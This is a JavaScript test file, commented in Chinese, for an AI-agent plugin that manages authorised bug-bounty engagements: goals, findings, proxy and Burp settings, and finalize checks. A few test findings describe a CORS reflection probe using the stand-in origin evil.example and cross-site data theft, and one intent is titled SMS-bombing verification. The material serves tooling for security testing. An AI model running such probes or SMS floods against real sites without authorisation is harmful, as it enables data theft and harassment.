  await assert.rejects(() => h.run("src_add_goal", { target: "OPPO", objective: "x" }, parent), /不是可测的公网目标/);
  const goal = await h.run("src_add_goal", { target: "example.test", objective: "fix-target" }, parent);
  await h.run("src_add_intent", { title: "i1", goalId: goal.id }, parent);
  const updated = await h.run("src_set_goal_target", { target: "sub.example.test（主域）" }, parent);
  assert.equal(updated.target, "sub.example.test");
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.goal.target, "sub.example.test");
  assert.equal(state.counts.intents, 1, "graph NOT reset by target fix");
});

test("[local.9] src_record_coverage treats empty assetId as absent instead of throwing", async () => {
  const h = harness();
  const parent = h.exec("p9c");
  await h.run("src_add_goal", { target: "example.test", objective: "cov" }, parent);
  const record = await h.run("src_record_coverage", { assetId: "", phase: "recon", category: "dorks", status: "completed" }, parent);
  assert.ok(record.id);
  const state = await h.run("src_state", {}, parent);
  const row = state.coverage.find((c) => c.category === "dorks");
  assert.ok(row, "coverage row recorded");
});

test("[local.9] src_state output includes observations/userTodos/infra without schema rejection", async () => {
  const h = harness();
  const parent = h.exec("p9d");
  await h.run("src_add_goal", { target: "example.test", objective: "schema" }, parent);
  await h.run("src_user_todo", { title: "登录 example.test 提供会话", kind: "auth-session" }, parent);
  const state = await h.run("src_state", {}, parent);
  assert.equal(Array.isArray(state.observations), true);
  assert.equal(Array.isArray(state.userTodos), true);
  assert.equal(state.userTodos.filter((t) => t.title === "登录 example.test 提供会话").length, 1); /* 按标题过滤 */
  assert.equal(typeof state.infra.proxyUrl, "string");
});

test("[local.9] infra settings: defaults, setInfra validation, projection fold and view resolution", async () => {
  const h = harness();
  const parent = h.exec("p9e");
  await h.run("src_add_goal", { target: "example.test", objective: "infra" }, parent);
  const before = await h.run("src_get_infra", {}, parent);
  assert.equal(before.infra.burpMcpPort, "9876");
  await assert.rejects(() => h.run("src_set_infra", { key: "nope", value: "1" }, parent), /key 必须是/);
  await assert.rejects(() => h.run("src_set_infra", { key: "proxyUrl", value: "not-a-proxy" }, parent), /proxyUrl 格式/);
  const saved = await h.run("src_set_infra", { key: "testPhone", value: "13800138000" }, parent);
  assert.equal(saved.value, "13800138000");
  // [local.10] testPhone accepts a comma-separated list; garbage still rejected
  const multi = await h.run("src_set_infra", { key: "testPhone", value: "13800138000，13900139000 15012345678" }, parent);
  assert.equal(multi.value, "13800138000，13900139000 15012345678");
  await assert.rejects(() => h.run("src_set_infra", { key: "testPhone", value: "13800138000,abc" }, parent), /多个用逗号分隔/);
  const after = await h.run("src_get_infra", {}, parent);
  assert.equal(after.infra.testPhone, "13800138000，13900139000 15012345678");
  assert.equal(after.processEnvProxy !== void 0, true);

  // clearing an override restores the built-in default
  await h.run("src_set_infra", { key: "burpMcpPort", value: "" }, parent);
  const cleared = await h.run("src_get_infra", {}, parent);
  assert.equal(cleared.infra.burpMcpPort, "9876", "cleared override must fall back to default");

  // projection: synthesize the same tool-call events and check resolved view
  let state = JSON.parse(JSON.stringify(srcInitialState));
  state = applySrcEvent(state, { type: "tool/call", data: { name: "src_add_goal", arguments: JSON.stringify({ target: "example.test", objective: "infra" }) } });
  state = applySrcEvent(state, { type: "tool/call", data: { name: "src_set_infra", arguments: JSON.stringify({ key: "testPhone", value: "13800138000" }) } });
  const view = viewSrcState(state);
  assert.equal(view.infra.testPhone, "13800138000");
  assert.equal(view.infra.burpMcpPort, "9876");
  // infra survives a goal reset in the projection
  state = applySrcEvent(state, { type: "tool/call", data: { name: "src_add_goal", arguments: JSON.stringify({ target: "other.test", objective: "reset" }) } });
  assert.equal(viewSrcState(state).infra.testPhone, "13800138000");
});

test("observation projection carries truncated response headers/snippet for the timeline", () => {
	let state = JSON.parse(JSON.stringify(srcInitialState));
	state = { ...state, goal: { id: "goal-1", target: "https://x.test", objective: "t", authorization: "SRC" } };
	state = { ...state, nodes: [...state.nodes, { id: "intent-1", kind: "intent", title: "i", detail: "d", status: "running", createdAt: 1 }] };
	state = applySrcEvent(state, { type: "tool/call", data: { name: "src_record_observation", arguments: JSON.stringify({
		intentId: "intent-1",
		assetId: "asset-9",
		method: "GET",
		path: "/admin",
		httpStatus: 403,
		respHeaders: "S".repeat(2000),
		respBodySnippet: "B".repeat(5000),
		protectionSignal: true,
		source: "burp-mcp",
		decision: "waf-blocked"
	}) } });
	const view = viewSrcState(state);
	const obs = view.observations.find((row) => row.path === "/admin");
	assert.ok(obs, "observation in view");
	assert.equal(obs.assetId, "asset-9");
	assert.equal(obs.respHeaders.length, 600);
	assert.equal(obs.respBodySnippet.length, 1200);
	assert.equal(obs.decision, "waf-blocked");
});


test("[local.11] panel commands: /src-infra direct-writes storage + synthetic event; probes registered; burp TCP pre-check gates the AI relay", async () => {
  const h = harness();
  for (const name of ["src-todo", "src-reject", "src-infra", "src-proxy-test", "src-burp-test"]) assert.equal(h.commands.has(name), true, `${name} registered`);

  // --- /src-infra: direct write, no followup, synthetic tool/call appended ---
  const parent = h.exec("pcmd");
  let followed = null;
  parent.agent.followup = (message) => { followed = message; };
  const saved = await h.commands.get("src-infra").handler({ rawInput: "testPhone 13800138000,13900139000", agent: parent.agent });
  assert.equal(saved.kind, "success");
  assert.equal(followed, null, "/src-infra must NOT wake the agent");
  const sessionLog = h.sessions.get("pcmd").events;
  const callEvents = sessionLog.filter((event) => event.type === "tool/call");
  assert.equal(callEvents.length, 1, "synthetic tool/call appended exactly once");
  /* [local.46] 合成事件统一带 turn/step/callId（客户端会话解析按 callId 配对，缺 callId 会在第二条时抛 more-than-one-start） */
  assert.equal(callEvents[0].data.name, "src_set_infra");
  assert.equal(callEvents[0].data.arguments, JSON.stringify({ key: "testPhone", value: "13800138000,13900139000" }));
  assert.ok(typeof callEvents[0].data.callId === "string" && callEvents[0].data.callId !== "", "合成事件带唯一 callId");
  const infraAfter = await h.run("src_get_infra", {}, parent);
  assert.equal(infraAfter.infra.testPhone, "13800138000,13900139000", "direct write landed in storage");

  // projection fold sees the synthetic event too (goal first: viewSrcState needs a goal)
  let state = JSON.parse(JSON.stringify(srcInitialState));
  state = applySrcEvent(state, { type: "tool/call", data: { name: "src_add_goal", arguments: JSON.stringify({ target: "example.test", objective: "cmd" }) } });
  state = applySrcEvent(state, { type: "tool/call", data: callEvents[0].data });
  assert.equal(viewSrcState(state).infra.testPhone, "13800138000,13900139000");

  // clearing via "-" restores default and still appends the event
  followed = null;
  sessionLog.length = 0;
  const cleared = await h.commands.get("src-infra").handler({ rawInput: "testPhone -", agent: parent.agent });
  assert.equal(cleared.kind, "success");
  assert.equal(followed, null);
  assert.equal((await h.run("src_get_infra", {}, parent)).infra.testPhone, "");

  // unknown key -> error text
  const bad = await h.commands.get("src-infra").handler({ rawInput: "nope x", agent: parent.agent });
  assert.equal(bad.kind, "error");

  // --- /src-burp-test with nothing listening on the configured port -> direct error, no AI ---
  await h.run("src_set_infra", { key: "burpMcpPort", value: "9499" }, parent);
  let burpFollowed = null;
  const burpResult = await h.commands.get("src-burp-test").handler({ rawInput: "", agent: { session: { id: "pcmd" }, followup: (m) => { burpFollowed = m; } } });
  assert.equal(burpResult.kind, "error", "closed port must fail fast host-side");
  assert.match(burpResult.text, /不可达|MCP Server/);
  assert.equal(burpFollowed, null, "closed port must not wake the agent");

  // --- /src-proxy-test without proxy configured -> direct answer, no AI ---
  let proxyFollowed = null;
  const proxyResult = await h.commands.get("src-proxy-test").handler({ rawInput: "", agent: { session: { id: "pcmd" }, followup: (m) => { proxyFollowed = m; } } });
  assert.equal(proxyResult.kind, "success");
  assert.match(proxyResult.text, /未配置 HTTP 代理/);
  assert.equal(proxyFollowed, null, "proxy probe must not wake the agent");

  // --- [local.12] viewSrcState works pre-goal so fresh sessions can configure infra ---
  const freshView = viewSrcState(JSON.parse(JSON.stringify(srcInitialState)));
  assert.equal(freshView.goal, null);
  assert.equal(freshView.infra.burpMcpPort, "9876");
  assert.deepEqual(freshView.counts, { intents: 0, facts: 0, findings: 0, assets: 0, coverage: 0, research: 0, checkpoints: 0, observations: 0, userTodos: 0, pendingApprovals: 0, testAccounts: 0, domainNotes: 0 });

  // --- [local.12] tool outputs must survive lossless JSON snapshotting ---
  // scan_surface non-stopped path previously emitted stopped:undefined -> "value is not lossless JSON"
  assert.equal(isJsonValue({ baseUrl: "https://x.test", requested: 1, responses: 1, hints: 0, preflight: { status: 200, headers: [], challenge: false, protection: false }, requiresDecision: false, results: [{ path: "/", status: 200, contentType: "text/html", length: 10, protectionSignal: false }] }), true, "scan_surface success shape must be lossless");
  // test_bypass error path previously emitted status:undefined via spread overwrite
  assert.equal(isJsonValue([{ method: "GET", path: "/a", headers: {}, body: "", note: "", phase: "variant", error: "timeout" }]), true, "test_bypass error shape must be lossless");
  // and the old buggy shapes must actually fail (guards the guard)
  assert.equal(isJsonValue({ stopped: void 0 }), false);
  assert.equal(isJsonValue([{ status: void 0, error: "x" }]), false);
});

test("[local.13] burp SSE handshake probe: closed port fails fast; live SSE endpoint passes without AI", async () => {
  const h = harness();
  const parent = h.exec("sse1");
  // 端口上没有任何东西：TCP 阶段直接失败，文本带 ① 编号
  await h.run("src_set_infra", { key: "burpMcpPort", value: "9553" }, parent);
  let woke = null;
  const closed = await h.commands.get("src-burp-test").handler({ rawInput: "", agent: { session: { id: "sse1" }, followup: (m) => { woke = m; } } });
  assert.equal(closed.kind, "error");
  assert.match(closed.text, /①TCP 探测失败/);
  assert.equal(woke, null);

  // 起一个假 SSE 服务：HTTP 200 + text/event-stream + 立即发 endpoint 事件
  const http = await import("node:http");
  const server = http.createServer((req, res) => {
    if (req.url === "/sse") {
      res.writeHead(200, { "content-type": "text/event-stream" });
      res.write("event: endpoint\ndata: \"session\\n\"\n\n");
    } else {
      res.writeHead(404); res.end();
    }
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = server.address().port;
  await h.run("src_set_infra", { key: "burpMcpPort", value: String(port) }, parent);
  const okResult = await h.commands.get("src-burp-test").handler({ rawInput: "", agent: { session: { id: "sse1" }, followup: (m) => { woke = m; } } });
  assert.equal(okResult.kind, "success");
  // [local.17] 文案改为桥端到端验证说明（直探只证扩展端点活着）
  assert.match(okResult.text, /②SSE 握手通过/);
  assert.match(okResult.text, /自愈桥/);
  assert.ok(woke, "SSE pass wakes the agent for tool-layer verification");
  const wokeText = JSON.stringify(woke);
  // [local.17] 端到端验证改为经自愈桥：tools_list + get_proxy_http_history
  assert.match(wokeText, /get_proxy_http_history/);
  server.close();
  server.closeAllConnections();

  // 非 SSE 服务（普通 404 页）：TCP 过但握手败，不扰 AI
  const server2 = http.createServer((req, res) => { res.writeHead(404, { "content-type": "text/html" }); res.end("<html>nope</html>"); });
  await new Promise((resolve) => server2.listen(0, "127.0.0.1", resolve));
  const port2 = server2.address().port;
  await h.run("src_set_infra", { key: "burpMcpPort", value: String(port2) }, parent);
  let woke2 = null;
  const sseFail = await h.commands.get("src-burp-test").handler({ rawInput: "", agent: { session: { id: "sse1" }, followup: (m) => { woke2 = m; } } });
  assert.equal(sseFail.kind, "error");
  assert.match(sseFail.text, /②SSE 握手失败/);
  assert.equal(woke2, null, "SSE failure must not wake the agent");
  server2.close();
  server2.closeAllConnections();
});

test("[local.13] src_fetch_policy fetches and strips HTML; finalize warns on pending todos and thin impact", async () => {
  const h = harness();
  const parent = h.exec("pol1");
  assert.equal(h.tools.has("src_fetch_policy"), true, "src_fetch_policy registered");

  // 假规则页
  const http = await import("node:http");
  const server = http.createServer((req, res) => {
    res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
    res.end("<html><head><script>var x=1;</script></head><body><h1>评分规则</h1><p>严重：RCE；&nbsp;高：敏感数据泄露</p><!--comment--></body></html>");
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = server.address().port;
  const result = await h.run("src_fetch_policy", { url: `http://127.0.0.1:${port}/rules` }, parent);
  assert.equal(result.status, 200);
  assert.match(result.text, /评分规则/);
  assert.match(result.text, /严重：RCE/);
  assert.doesNotMatch(result.text, /<h1>|<p>|script>/);
  assert.equal(result.text.includes("var x"), false, "script content dropped");
  server.close();

  // finalize：pending 待办 + impact <40 字 都要出 warning
  await h.run("src_add_goal", { target: "example.test", objective: "policy gate" }, parent);
  const goalState = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "i1", detail: "d", goalId: goalState.goal.id }, parent);
  const intentId = intent.id;
  await h.run("src_update_intent", { intentId, status: "completed" }, parent);
  // pending 用户待办
  await h.run("src_user_todo", { title: "请登录提供会话", kind: "auth-session" }, parent);
  // 一个 finding（impact 只有 5 字，触发 thin-impact warning）
  const factEvidence4 = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "GET / with Origin 反射 -> ACAO:*", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", { intentId, title: "CORS 配置错误", severity: "medium", impact: "配置不安全", affectedScope: "https://example.test", remediation: "修复 CORS", pocEvidence: ["raw poc"], reproducibleSteps: ["step1"], rawRequest: "GET / HTTP/1.1\r\nHost: example.test\r\n\r\n", victimImpact: "已登录用户的隐私响应可被第三方站点跨域读取且全程无感知，存在批量收集风险", attackPrerequisites: "攻击者需在任意外域托管页面并诱导已登录用户访问", concreteLossEvidence: [factEvidence4] }, parent);
  const state1 = await h.run("src_state", {}, parent);
  const findingId = state1.findings[0]?.id;
  assert.ok(findingId, "finding recorded");
  await h.run("src_record_research", { intentId, category: "web", hypothesis: "cors misconfig on example.test", findingId, status: "verified" }, parent);
  const fin = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  /* [local.20] pending 待办从 warning 升级为 blocker：ready=false 且待办出现在 blockers。 */
  assert.equal(fin.ready, false, "pending todo is now a blocker");
  const allWarnings = [...fin.blockers, ...fin.warnings].join("\n");
  assert.match(allWarnings, /未完成的用户待办/, "pending todo warning present");
  assert.match(allWarnings, /impact 危害论证过短/, "thin impact warning present");
});


test("[local.14] /src-infra-copy copies latest other session's infra overrides; no source -> friendly message", async () => {
  /* SrcStore caches the opened domain in a module-level map shared across harnesses; drop it so this
     test's fresh MemoryDomain is actually adopted instead of a previous test's tables. */
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  assert.equal(h.commands.has("src-infra-copy"), true, "src-infra-copy registered");
  const source = h.exec("sess-old");
  const target = h.exec("sess-new");

  // 本用例独享新打开的 MemoryDomain，无历史遗留数据；无任何来源 -> 友好提示
  const none = await h.commands.get("src-infra-copy").handler({ rawInput: "", agent: target.agent });
  assert.equal(none.kind, "success");
  assert.match(none.text, /没有可复用的基础设施/);

  // 源会话保存两项（其中一项随后清空恢复默认，不应被复制）
  await h.commands.get("src-infra").handler({ rawInput: "proxyUrl http://192.0.2.88:7893", agent: source.agent });
  await h.commands.get("src-infra").handler({ rawInput: "testPhone 13800138000", agent: source.agent });
  await h.commands.get("src-infra").handler({ rawInput: "testPhone -", agent: source.agent });

  // 目标会话一键沿用：直写 + 合成投影事件 + 不打扰 agent
  let followed = null;
  target.agent.followup = (message) => { followed = message; };
  const copied = await h.commands.get("src-infra-copy").handler({ rawInput: "", agent: target.agent });
  assert.equal(copied.kind, "success");
  assert.match(copied.text, /已沿用上次会话的基础设施（1 项）/);
  assert.match(copied.text, /proxyUrl=http:\/\/192\.0\.2\.88:7893/);
  assert.doesNotMatch(copied.text, /testPhone/, "cleared override must not be copied");
  assert.equal(followed, null, "/src-infra-copy must NOT wake the agent");
  const infra = await h.run("src_get_infra", {}, target);
  assert.equal(infra.infra.proxyUrl, "http://192.0.2.88:7893", "override landed in storage");
  assert.equal(infra.infra.testPhone, "", "untouched key stays default");

  // 合成 tool/call 与直写一致（投影 fold 可见）
  const callEvents = h.sessions.get("sess-new").events.filter((event) => event.type === "tool/call");
  assert.equal(callEvents.length, 1);
  /* [local.46] 合成事件带唯一 callId；name/arguments 不变 */
  assert.equal(callEvents[0].data.name, "src_set_infra");
  assert.equal(callEvents[0].data.arguments, JSON.stringify({ key: "proxyUrl", value: "http://192.0.2.88:7893" }));
  assert.ok(typeof callEvents[0].data.callId === "string" && callEvents[0].data.callId !== "");

  // 投影视图端到端：目标会话视图里能看到沿用来的值
  let state = JSON.parse(JSON.stringify(srcInitialState));
  state = applySrcEvent(state, { type: "tool/call", data: callEvents[0].data });
  assert.equal(viewSrcState(state).infra.proxyUrl, "http://192.0.2.88:7893");

  // 再沿用一次：仍以 sess-old 为源（自己不算来源），幂等无害
  const again = await h.commands.get("src-infra-copy").handler({ rawInput: "", agent: target.agent });
  assert.equal(again.kind, "success");
  assert.match(again.text, /proxyUrl=http:\/\/192\.0\.2\.88:7893/, "re-copy stays sourced from the other session");
  const eventsAfter = h.sessions.get("sess-new").events.filter((event) => event.type === "tool/call");
  assert.ok(eventsAfter.length >= 2, "each copy appends its synthetic events");
});

test("[local.15] finalize 受限完成声明后 src_state/src_graph 输出仍是 lossless JSON（undefined 属性被剥离）", async () => {
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("ll1");
  await h.run("src_add_goal", { target: "example.test", objective: "lossless gate" }, parent);
  const state = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "i1", detail: "d", goalId: state.goal.id }, parent);
  await h.run("src_update_intent", { intentId: intent.id, status: "completed" }, parent);
  // allowIncomplete=true 触发 upsertCoverage({ assetId: void 0, ... }) —— 此前会把 undefined 写进内存记录，
  // 污染后续 src_state/src_graph 的 lossless 输出（真实事故：session-349ed2ec turn3 两工具连续失败）。
  await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true, allowIncompleteReason: "用户指示停止" }, parent);
  // 直接检查内存表里的受限完成声明行不含值为 undefined 的自有属性
  const covTable = h.domain.table("coverage");
  for (const [, row] of covTable.entries()) {
    for (const [key, value] of Object.entries(row)) assert.notEqual(value, void 0, `coverage row key ${key} must not be undefined`);
  }
  // 且两个读路径的完整输出都通过官方 lossless 校验
  const { isJsonValue } = await import("@deepseek-ai/dsh-session");
  const after = await h.run("src_state", {}, parent);
  assert.equal(isJsonValue(after), true, "src_state output must be lossless after restricted-completion coverage");
  const graph = await h.run("src_graph", {}, parent);
  assert.equal(isJsonValue(graph), true, "src_graph output must be lossless after restricted-completion coverage");
});

test("[local.15] 智能代理路由：非名单域名直连、名单域名走代理", async () => {
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("route1");
  // 本地目标服务：若请求到达则证明走了直连（代理地址必败）
  const http = await import("node:http");
  const server = http.createServer((req, res) => { res.writeHead(200, { "content-type": "text/plain" }); res.end("direct-hit"); });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = server.address().port;
  // 配置一个必然连不上的代理
  await h.run("src_set_infra", { key: "proxyUrl", value: "http://127.0.0.1:1" }, parent);
  // 非名单域名（127.0.0.1）：直连成功，不受必败代理影响
  const fetched = await h.run("src_fetch_policy", { url: `http://127.0.0.1:${port}/policy` }, parent);
  assert.equal(fetched.status, 200);
  assert.match(fetched.text, /direct-hit/);
  // 名单域名（github.com → PROXY_REQUIRED_HOST_SUFFIXES 命中）：必须经代理 → 必败代理导致失败，证明代理生效
  await assert.rejects(
    () => h.run("src_fetch_policy", { url: "https://github.com/robots.txt" }, parent),
    /ECONNREFUSED|CONNECT|fetch failed|aggregate error/i,
  );
  server.close();
});

test("[local.64] legacy TLS 重协商降级：报错后自动用 SSL_OP_LEGACY_SERVER_CONNECT 重试一次", async () => {
  const { makeHttpFetch } = await import("../lib/src.js");
  const http = makeHttpFetch({ proxyUrl: "", httpTimeoutMs: "4000" });
  const originalFetch = globalThis.fetch;
  const originalTlsReject = process.env.NODE_TLS_REJECT_UNAUTHORIZED;
  try {
    // 本地 TLS 服务（自签证书，openssl CLI 生成；macOS 自带 LibreSSL）
    const fsPromises = (await import("node:fs")).promises;
    const tmpDir = await fsPromises.mkdtemp("/tmp/l64-tls-");
    const { execFile } = await import("node:child_process");
    const { promisify } = await import("node:util");
    const run = promisify(execFile);
    const keyP = `${tmpDir}/key.pem`, certP = `${tmpDir}/cert.pem`;
    await run("/usr/bin/openssl", ["req", "-x509", "-newkey", "rsa:2048", "-keyout", keyP, "-out", certP, "-days", "1", "-nodes", "-subj", "/CN=localhost"]);
    const [key, cert] = await Promise.all([fsPromises.readFile(keyP, "utf8"), fsPromises.readFile(certP, "utf8")]);
    const tls = await import("node:tls");
    const server = tls.createServer({ key, cert }, (socket) => {
      socket.on("data", () => socket.write("HTTP/1.1 200 OK\r\ncontent-type: text/plain\r\nconnection: close\r\n\r\nlegacy-ok"));
      socket.on("error", () => {});
    });
    await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
    const port = server.address().port;
    process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0"; // 自签证书：降级路径默认严格校验会拒，仅测试进程内临时放宽
    // ① 严格 fetch 被打桩成报 legacy renegotiation（模拟 kfapi 场景）→ 应自动降级重试并拿到响应
    globalThis.fetch = async () => {
      const err = new TypeError("fetch failed");
      err.cause = Object.assign(new Error("ssl routines:unsafe legacy renegotiation disabled"), { opensslErrorStack: ["806105F601000000:error:0A000152:SSL routines:final_renegotiate:unsafe legacy renegotiation disabled"] });
      throw err;
    };
    const res = await http(`https://localhost:${port}/x`, { method: "POST", redirect: "manual", headers: { "content-type": "application/json" }, body: "{}" });
    assert.equal(res.status, 200);
    assert.equal(await res.text(), "legacy-ok");
    // ② 降级重试也失败（必败端口）→ 报错带通道对照指引与原始原因
    await assert.rejects(
      () => http("https://127.0.0.1:1/x", { method: "GET", redirect: "manual" }),
      (e) => /网络层失败|legacy renegotiation|通道/.test(e.message) && /ECONNREFUSED/.test(e.message),
    );
    // ③ 非 legacy 的普通网络失败：不触发降级（直接抛），报错仍带通道对照指引与原始原因
    globalThis.fetch = async () => { throw new TypeError("fetch failed"); };
    await assert.rejects(
      () => http("https://127.0.0.1:1/y", { method: "GET", redirect: "manual" }),
      (e) => /通道差异/.test(e.message) && /fetch failed/.test(e.message),
    );
    server.close();
    await fsPromises.rm(tmpDir, { recursive: true, force: true });
  } finally {
    globalThis.fetch = originalFetch;
    if (originalTlsReject === void 0) delete process.env.NODE_TLS_REJECT_UNAUTHORIZED; else process.env.NODE_TLS_REJECT_UNAUTHORIZED = originalTlsReject;
  }
});

test("[local.64] 投影待办 id 与 store 同源：合成事件带真实 id；无 id 新建回退 userTodo- 前缀；更新按 id 命中不再静默丢失", async () => {
  const { applySrcEvent, srcInitialState } = await import("../lib/src.js");
  const fold = (state, name, args) => applySrcEvent(state, { type: "tool/call", data: { name, arguments: JSON.stringify(args) } });
  // ① 合成事件携带真实 store id（覆盖面待办/数据编排路径）→ 投影行 id 与 store 一致
  const withId = fold(srcInitialState, "src_user_todo", { id: "userTodo-1", title: "请在微信搜索 l63ui-e2e.test 主体相关的小程序", detail: "d", kind: "asset-provide" });
  assert.equal(withId.userTodos[0].id, "userTodo-1");
  // ② 无 id 新建（agent 直接 src_user_todo 的常规事件）→ 回退 userTodo-<行数+1>，不再自造 todo- 前缀
  const noId = fold(srcInitialState, "src_user_todo", { title: "t1", detail: "", kind: "other" });
  assert.equal(noId.userTodos[0].id, "userTodo-1");
  const noId2 = fold(noId, "src_user_todo", { title: "t2", detail: "" });
  assert.equal(noId2.userTodos[1].id, "userTodo-2");
  // ③ 更新事件按 store id 命中投影行（此前 todo- vs userTodo- 漂移导致更新静默丢失）
  const updated = fold(withId, "src_user_todo", { userTodoId: "userTodo-1", status: "abandoned", note: "用户拍板放弃" });
  assert.equal(updated.userTodos[0].status, "abandoned");
  assert.equal(updated.userTodos[0].note, "用户拍板放弃");
  // ④ 更新不存在的 id：安全 no-op（不建新行）
  const noop = fold(withId, "src_user_todo", { userTodoId: "userTodo-99", status: "done" });
  assert.equal(noop.userTodos.length, 1);
  assert.equal(noop.userTodos[0].status, "pending");
});

test("[local.15] src_recover_child 无 checkpoint 子代理也可唤醒；额度限制与 intent 状态回写不变", async () => {
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("rec1");
  await h.run("src_add_goal", { target: "example.test", objective: "recover" }, parent);
  const state = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "短信轰炸验证", detail: "d", goalId: state.goal.id }, parent);
  // 关键回归：子代理从未提交 checkpoint（首轮就因 API 失败）也能唤醒——此前报
  // "requires a child checkpoint linked to the specified parent intent"
  const first = await h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "继续短信轰炸验证" }, parent);
  assert.equal(first.attempt, 1);
  assert.ok(first.messageId, "followup queued");
  const second = await h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "再次尝试" }, parent);
  assert.equal(second.attempt, 2);
  assert.equal(h.ctx.subagents.followupCalls.length, 2, "two followups queued for the same child");
  // [local.16] 额度 2→4：供应商波动/网络不稳定属基础设施故障，应继续唤醒续跑
  const third = await h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "供应商恢复了继续" }, parent);
  assert.equal(third.attempt, 3);
  const fourth = await h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "最后一次" }, parent);
  assert.equal(fourth.attempt, 4);
  await assert.rejects(
    () => h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "第五次" }, parent),
    /recovery limit reached/,
  );
  // 唤醒把 intent 从 failed 拉回 running
  const after = await h.run("src_state", {}, parent);
  assert.equal(after.intents.find((row) => row.id === intent.id).status, "running");
});

test("[local.16] src_update_finding 重写字段：store 直写 + fold 投影同步 + 标题冲突拒绝", async () => {
  process.env.DSH_SRC_LESSONS_DIR = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("upd1");
  await h.run("src_add_goal", { target: "example.test", objective: "update" }, parent);
  const state = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "CORS 验证", detail: "d", goalId: state.goal.id }, parent);
  const factEvidence5 = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "GET /api/profile Origin 反射 -> ACAC true", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", { intentId: intent.id, title: "CORS 配置不安全", severity: "low", impact: "太短", affectedScope: "全站", remediation: "收紧", pocEvidence: ["e1"], reproducibleSteps: ["GET /"], victimImpact: "已登录用户的个人资料可被第三方站点静默读取且无感知，存在隐私批量泄露风险", attackPrerequisites: "攻击者需在任意外域托管页面并诱导已登录用户访问", concreteLossEvidence: [factEvidence5] }, parent);
  // 重写：impact/victimImpact/severity
  const upd = await h.run("src_update_finding", {
    findingId: "finding-1",
    severity: "medium",
    impact: "攻击者托管恶意页面诱导已登录用户访问，JS 以受害者 Cookie 读取 /api/profile 返回的姓名、手机号与订单摘要，可批量收集平台用户资料",
    victimImpact: "受害者为该站已登录用户；个人资料被第三方站点静默读取且全程无任何感知",
    reproducibleSteps: ["GET /api/profile with Origin: https://evil.example", "观察 ACAO 反射 + ACAC true"]
  }, parent);
  assert.deepEqual(upd.updated.sort(), ["impact", "reproducibleSteps", "severity", "victimImpact"]);
  const after = await h.run("src_state", {}, parent);
  const finding = after.findings.find((row) => row.id === "finding-1");
  assert.equal(finding.severity, "medium");
  assert.ok(finding.impact.includes("诱导已登录用户访问"), "impact rewritten");
  assert.ok((finding.victimImpact ?? "").includes("无任何感知"), "victimImpact written");
  assert.equal(finding.reproducibleSteps.length, 2, "steps replaced");
  // 标题冲突：新建第二个 finding 后改名为同名应拒绝
  await h.run("src_add_finding", { intentId: intent.id, title: "第二个漏洞", severity: "low", impact: "x".repeat(50), affectedScope: "s", remediation: "r", pocEvidence: ["e2"], reproducibleSteps: ["GET /"], victimImpact: "已登录用户的资料可被第三方站点静默读取且无感知，存在批量泄露风险", attackPrerequisites: "攻击者需在任意外域托管页面并诱导已登录用户访问", concreteLossEvidence: [factEvidence5] }, parent);
  await assert.rejects(
    () => h.run("src_update_finding", { findingId: "finding-2", title: "cors 配置不安全" }, parent),
    /同名 finding/,
  );
  // 未知 finding id 给出友好错误
  await assert.rejects(
    () => h.run("src_update_finding", { findingId: "finding-99", title: "nope" }, parent),
    /先调 src_state/,
  );
  // 空字符串解除资产关联 + asset 校验
  await assert.rejects(
    () => h.run("src_update_finding", { findingId: "finding-1", affectedAssetId: "asset-404" }, parent),
    /asset|资产/,
  );
});

test("[local.25] finding 准入闸：危害链三要素缺一拒绝 + 不可解析证据拒绝 + info 移除与弱信号路由", async () => {
  const h = harness();
  const parent = h.exec("gate25");
  await h.run("src_add_goal", { target: "https://example.test", objective: "准入闸验证", authorization: "SRC" }, parent);
  const intent = await h.run("src_add_intent", { title: "CORS 验证", detail: "d", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: intent.id, status: "completed" }, parent);
